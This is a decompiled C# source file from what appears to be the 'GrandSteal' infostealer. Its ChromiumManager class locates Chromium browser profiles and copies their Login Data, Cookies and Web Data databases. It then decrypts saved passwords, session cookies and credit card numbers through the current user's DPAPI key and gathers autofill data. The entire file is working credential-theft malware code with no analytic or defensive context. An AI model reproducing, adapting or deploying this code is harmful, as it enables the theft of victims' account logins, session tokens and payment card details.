using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Threading;
using GrandSteal.Client.Data.Helpers;
using GrandSteal.Client.Data.SQLite;
using GrandSteal.Client.Models.Credentials;
using GrandSteal.Client.Models.Extensions.Nulls;
using GrandSteal.SharedModels.Models;

namespace GrandSteal.Client.Data.Recovery
{
	// Token: 0x02000012 RID: 18
	public class ChromiumManager : ICredentialsManager<BrowserProfile>
	{
		// Token: 0x06000067 RID: 103 RVA: 0x00004A30 File Offset: 0x00002C30
		public List<BrowserProfile> GetAll()
		{
			List<BrowserProfile> browserProfiles = new List<BrowserProfile>();
			try
			{
				int countCompleted = 0;
				object locker = new object();
				List<string> list = this.FindProfiles();
				using (List<string>.Enumerator enumerator = list.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						string rootPath = enumerator.Current;
						new Thread(delegate
						{
							BrowserProfile browserProfile = new BrowserProfile();
							try
							{
								string fullName = new FileInfo(rootPath).Directory.FullName;
								string text = rootPath.Contains(ConstantStorage.RoamingAppData) ? this.ParseRoamingBrowserName(fullName) : this.ParseLocalBrowserName(fullName);
								if (!string.IsNullOrEmpty(text))
								{
									text = text[0].ToString().ToUpper() + text.Remove(0, 1);
									string text2 = this.ParseProfileName(fullName);
									if (!string.IsNullOrEmpty(text2))
									{
										browserProfile.Name = text;
										browserProfile.Profile = text2;
										browserProfile.BrowserCookies = this.GetCookies(fullName).IsNull<List<BrowserCookie>>();
										browserProfile.BrowserCredendtials = this.GetCredentials(fullName).IsNull<List<BrowserCredendtial>>();
										browserProfile.BrowserAutofills = this.GetAutofills(fullName).IsNull<List<BrowserAutofill>>();
										browserProfile.BrowserCreditCards = this.GetCreditCards(fullName).IsNull<List<BrowserCreditCard>>();
									}
								}
							}
							catch
							{
							}
							object locker = locker;
							lock (locker)
							{
								List<BrowserCookie> expr_15E = browserProfile.BrowserCookies;
								bool arg_18C_0;
								if (expr_15E == null)
								{
									arg_18C_0 = false;
								}
								else
								{
									Predicate<BrowserCookie> arg_184_1;
									if ((arg_184_1 = ChromiumManager.<>c.<>9__0_1) == null)
									{
										arg_184_1 = (ChromiumManager.<>c.<>9__0_1 = new Predicate<BrowserCookie>(ChromiumManager.<>c.<>9.<GetAll>b__0_1));
									}
									arg_18C_0 = (expr_15E.Count(arg_184_1) > 0);
								}
								if (!arg_18C_0)
								{
									List<BrowserCredendtial> expr_197 = browserProfile.BrowserCredendtials;
									bool arg_1C5_0;
									if (expr_197 == null)
									{
										arg_1C5_0 = false;
									}
									else
									{
										Predicate<BrowserCredendtial> arg_1BD_1;
										if ((arg_1BD_1 = ChromiumManager.<>c.<>9__0_2) == null)
										{
											arg_1BD_1 = (ChromiumManager.<>c.<>9__0_2 = new Predicate<BrowserCredendtial>(ChromiumManager.<>c.<>9.<GetAll>b__0_2));
										}
										arg_1C5_0 = (expr_197.Count(arg_1BD_1) > 0);
									}
									if (!arg_1C5_0)
									{
										List<BrowserCreditCard> expr_1CD = browserProfile.BrowserCreditCards;
										bool arg_1FB_0;
										if (expr_1CD == null)
										{
											arg_1FB_0 = false;
										}
										else
										{
											Predicate<BrowserCreditCard> arg_1F3_1;
											if ((arg_1F3_1 = ChromiumManager.<>c.<>9__0_3) == null)
											{
												arg_1F3_1 = (ChromiumManager.<>c.<>9__0_3 = new Predicate<BrowserCreditCard>(ChromiumManager.<>c.<>9.<GetAll>b__0_3));
											}
											arg_1FB_0 = (expr_1CD.Count(arg_1F3_1) > 0);
										}
										if (!arg_1FB_0)
										{
											List<BrowserAutofill> expr_203 = browserProfile.BrowserAutofills;
											bool arg_231_0;
											if (expr_203 == null)
											{
												arg_231_0 = false;
											}
											else
											{
												Predicate<BrowserAutofill> arg_229_1;
												if ((arg_229_1 = ChromiumManager.<>c.<>9__0_4) == null)
												{
													arg_229_1 = (ChromiumManager.<>c.<>9__0_4 = new Predicate<BrowserAutofill>(ChromiumManager.<>c.<>9.<GetAll>b__0_4));
												}
												arg_231_0 = (expr_203.Count(arg_229_1) > 0);
											}
											if (!arg_231_0)
											{
												goto IL_249;
											}
										}
									}
								}
								browserProfiles.Add(browserProfile);
								IL_249:
								int countCompleted = countCompleted;
								countCompleted++;
							}
						}).Start();
					}
				}
				while (countCompleted != list.Count)
				{
				}
			}
			catch
			{
			}
			return browserProfiles;
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00004B04 File Offset: 0x00002D04
		public List<BrowserCredendtial> GetCredentials(string profilePath)
		{
			List<BrowserCredendtial> list = new List<BrowserCredendtial>();
			try
			{
				string text = Path.Combine(profilePath, "Login Data");
				if (!File.Exists(text))
				{
					return list;
				}
				SqlConnection sqlConnection = new SqlConnection(RecoveryHelper.CreateTempCopy(text));
				sqlConnection.ReadTable("logins");
				int i = 0;
				while (i < sqlConnection.GetRowCount())
				{
					BrowserCredendtial browserCredendtial = new BrowserCredendtial();
					try
					{
						browserCredendtial = this.ReadBrowserCredendtial(sqlConnection, i);
						goto IL_A6;
					}
					catch
					{
						goto IL_A6;
					}
					goto IL_5D;
					IL_9E:
					i++;
					continue;
					IL_5D:
					if (browserCredendtial.Login != "UNKNOWN" && browserCredendtial.Password != "UNKNOWN" && browserCredendtial.URL != "UNKNOWN")
					{
						list.Add(browserCredendtial);
						goto IL_9E;
					}
					goto IL_9E;
					IL_A6:
					if (browserCredendtial.Login.IsNotNull<string>())
					{
						goto IL_5D;
					}
					goto IL_9E;
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000069 RID: 105 RVA: 0x00004BEC File Offset: 0x00002DEC
		public List<BrowserCookie> GetCookies(string profilePath)
		{
			List<BrowserCookie> list = new List<BrowserCookie>();
			try
			{
				string text = Path.Combine(profilePath, "Cookies");
				if (!File.Exists(text))
				{
					return list;
				}
				SqlConnection sqlConnection = new SqlConnection(RecoveryHelper.CreateTempCopy(text));
				sqlConnection.ReadTable("cookies");
				int i = 0;
				while (i < sqlConnection.GetRowCount())
				{
					BrowserCookie browserCookie = null;
					try
					{
						browserCookie = new BrowserCookie
						{
							Host = sqlConnection.GetValue(i, "host_key").Trim(),
							Http = (sqlConnection.GetValue(i, "httponly") == "1"),
							Path = sqlConnection.GetValue(i, "path").Trim(),
							Secure = (sqlConnection.GetValue(i, "secure") == "1"),
							Expires = sqlConnection.GetValue(i, "expires_utc").Trim(),
							Name = sqlConnection.GetValue(i, "name").Trim(),
							Value = RecoveryHelper.DecryptBlob(sqlConnection.GetValue(i, "encrypted_value"), DataProtectionScope.CurrentUser, null).Trim()
						};
						goto IL_124;
					}
					catch (Exception)
					{
						goto IL_124;
					}
					goto IL_111;
					IL_119:
					i++;
					continue;
					IL_111:
					list.Add(browserCookie);
					goto IL_119;
					IL_124:
					if (browserCookie != null)
					{
						goto IL_111;
					}
					goto IL_119;
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00004D60 File Offset: 0x00002F60
		public List<BrowserAutofill> GetAutofills(string profilePath)
		{
			List<BrowserAutofill> list = new List<BrowserAutofill>();
			try
			{
				string text = Path.Combine(profilePath, "Web Data");
				if (!File.Exists(text))
				{
					return list;
				}
				SqlConnection sqlConnection = new SqlConnection(RecoveryHelper.CreateTempCopy(text));
				sqlConnection.ReadTable("autofill");
				int i = 0;
				while (i < sqlConnection.GetRowCount())
				{
					BrowserAutofill browserAutofill = null;
					try
					{
						browserAutofill = new BrowserAutofill
						{
							Name = sqlConnection.GetValue(i, "name").Trim(),
							Value = sqlConnection.GetValue(i, "value").Trim()
						};
						goto IL_95;
					}
					catch
					{
						goto IL_95;
					}
					goto IL_85;
					IL_8D:
					i++;
					continue;
					IL_85:
					list.Add(browserAutofill);
					goto IL_8D;
					IL_95:
					if (browserAutofill != null)
					{
						goto IL_85;
					}
					goto IL_8D;
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00004E2C File Offset: 0x0000302C
		public List<BrowserCreditCard> GetCreditCards(string profilePath)
		{
			List<BrowserCreditCard> list = new List<BrowserCreditCard>();
			try
			{
				string text = Path.Combine(profilePath, "Web Data");
				if (!File.Exists(text))
				{
					return list;
				}
				SqlConnection sqlConnection = new SqlConnection(RecoveryHelper.CreateTempCopy(text));
				sqlConnection.ReadTable("credit_cards");
				int i = 0;
				while (i < sqlConnection.GetRowCount())
				{
					BrowserCreditCard browserCreditCard = null;
					try
					{
						browserCreditCard = new BrowserCreditCard
						{
							Holder = sqlConnection.GetValue(i, "name_on_card").Trim(),
							ExpirationMonth = Convert.ToInt32(sqlConnection.GetValue(i, "expiration_month").Trim()),
							ExpirationYear = Convert.ToInt32(sqlConnection.GetValue(i, "expiration_year").Trim()),
							CardNumber = RecoveryHelper.DecryptBlob(sqlConnection.GetValue(i, "card_number_encrypted"), DataProtectionScope.CurrentUser, null).Trim()
						};
						goto IL_DC;
					}
					catch
					{
						goto IL_DC;
					}
					goto IL_C9;
					IL_D1:
					i++;
					continue;
					IL_C9:
					list.Add(browserCreditCard);
					goto IL_D1;
					IL_DC:
					if (browserCreditCard != null)
					{
						goto IL_C9;
					}
					goto IL_D1;
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600006C RID: 108 RVA: 0x00004F40 File Offset: 0x00003140
		private BrowserCredendtial ReadBrowserCredendtial(SqlConnection manager, int row)
		{
			BrowserCredendtial browserCredendtial = new BrowserCredendtial();
			try
			{
				browserCredendtial.URL = manager.GetValue(row, "origin_url").Trim();
				browserCredendtial.Login = manager.GetValue(row, "username_value").Trim();
				browserCredendtial.Password = RecoveryHelper.DecryptBlob(manager.GetValue(row, "password_value"), DataProtectionScope.CurrentUser, null).Trim();
			}
			catch
			{
			}
			finally
			{
				browserCredendtial.Login = (string.IsNullOrEmpty(browserCredendtial.Login) ? "UNKNOWN" : browserCredendtial.Login);
				browserCredendtial.Password = (string.IsNullOrEmpty(browserCredendtial.Password) ? "UNKNOWN" : browserCredendtial.Password);
				browserCredendtial.URL = (string.IsNullOrEmpty(browserCredendtial.URL) ? "UNKNOWN" : browserCredendtial.URL);
			}
			return browserCredendtial;
		}

		// Token: 0x0600006D RID: 109 RVA: 0x00005024 File Offset: 0x00003224
		private string ParseProfileName(string path)
		{
			try
			{
				string[] array = path.Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				if (array[array.Length - 2] == "User Data")
				{
					return array[array.Length - 1];
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x0600006E RID: 110 RVA: 0x00005080 File Offset: 0x00003280
		private string ParseRoamingBrowserName(string path)
		{
			try
			{
				return path.Split(new string[]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries)[0];
			}
			catch
			{
			}
			return string.Empty;
		}

		// Token: 0x0600006F RID: 111 RVA: 0x000050D4 File Offset: 0x000032D4
		private string ParseLocalBrowserName(string path)
		{
			try
			{
				string[] array = path.Split(new string[]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				return array[0] + "_[" + array[1] + "]";
			}
			catch
			{
			}
			return string.Empty;
		}

		// Token: 0x06000070 RID: 112 RVA: 0x0000513C File Offset: 0x0000333C
		private List<string> FindProfiles()
		{
			List<string> list = new List<string>();
			try
			{
				list.AddRange(RecoveryHelper.FindPaths(ConstantStorage.RoamingAppData, 4, 1, new string[]
				{
					"Login Data",
					"Web Data",
					"Cookies"
				}));
				list.AddRange(RecoveryHelper.FindPaths(ConstantStorage.LocalAppData, 4, 1, new string[]
				{
					"Login Data",
					"Web Data",
					"Cookies"
				}));
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x02000016 RID: 22
		[CompilerGenerated]
		[Serializable]
		private sealed class <>c
		{
			// Token: 0x06000078 RID: 120 RVA: 0x0000236F File Offset: 0x0000056F
			internal bool <GetAll>b__0_1(BrowserCookie x)
			{
				return x.IsNotNull<BrowserCookie>();
			}

			// Token: 0x06000079 RID: 121 RVA: 0x00002377 File Offset: 0x00000577
			internal bool <GetAll>b__0_2(BrowserCredendtial x)
			{
				return x.IsNotNull<BrowserCredendtial>();
			}

			// Token: 0x0600007A RID: 122 RVA: 0x0000237F File Offset: 0x0000057F
			internal bool <GetAll>b__0_3(BrowserCreditCard x)
			{
				return x.IsNotNull<BrowserCreditCard>();
			}

			// Token: 0x0600007B RID: 123 RVA: 0x00002387 File Offset: 0x00000587
			internal bool <GetAll>b__0_4(BrowserAutofill x)
			{
				return x.IsNotNull<BrowserAutofill>();
			}

			// Token: 0x04000051 RID: 81
			public static readonly ChromiumManager.<>c <>9 = new ChromiumManager.<>c();

			// Token: 0x04000052 RID: 82
			public static Predicate<BrowserCookie> <>9__0_1;

			// Token: 0x04000053 RID: 83
			public static Predicate<BrowserCredendtial> <>9__0_2;

			// Token: 0x04000054 RID: 84
			public static Predicate<BrowserCreditCard> <>9__0_3;

			// Token: 0x04000055 RID: 85
			public static Predicate<BrowserAutofill> <>9__0_4;
		}
	}
}
